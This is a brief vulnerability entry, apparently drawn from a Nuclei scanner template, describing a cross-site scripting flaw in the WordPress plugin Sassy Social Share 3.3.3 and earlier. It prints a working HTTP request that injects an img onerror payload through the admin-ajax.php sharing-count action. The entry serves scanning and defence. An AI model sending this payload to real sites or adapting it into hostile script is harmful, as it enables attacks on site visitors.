# Vulnerability: Sassy Social Share <=3.3.3 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`sassy-social-share.yaml`)

## Description
WordPress Sassy Social Share 3.3.3 and prior is vulnerable to cross-site scripting because certain AJAX endpoints return JSON data with no Content-Type header set and then use the default text/html. In other words, any JSON that has HTML will be rendered as such.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[%3Cimg%20src%3dx%20onerror%3dalert(document.domain)%3E]=
```

